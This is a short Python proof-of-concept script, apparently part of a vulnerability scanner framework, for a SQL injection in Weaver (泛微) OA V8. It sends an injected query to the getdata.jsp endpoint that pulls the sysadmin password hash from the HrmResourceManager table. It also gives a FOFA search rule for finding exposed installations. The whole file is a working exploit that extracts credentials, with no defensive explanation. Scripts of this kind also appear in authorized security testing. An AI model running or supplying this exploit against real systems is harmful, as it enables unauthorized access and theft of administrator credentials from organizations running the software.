#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests

from Config.config_proxies import proxies
from Config.config_requests import headers
requests.packages.urllib3.disable_warnings()

########################################################################################################################
# 脚本信息
NAME='Weaver_OA_V8_sqlinjection'
AUTHOR="RabbitMask"
REMARK='泛微OA V8 SQL注入漏洞'
FOFA_RULE='app="泛微-协同办公OA"'
########################################################################################################################


def poc(target):
    result={}
    try:
        url = target + "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
        r = requests.get(url=url,headers=headers,verify=False,timeout=5,proxies=proxies)
        if r.status_code == 200  and 'html' not in r.text:
            result["target"] = target
            result["poc"] = NAME
            result["url"] = url
            result["用户"] = 'sysadmin'
            result["密码MD5"] = r.text.strip()
            return result
    except:
        pass

if __name__ == '__main__':
    poc("http://127.0.0.1")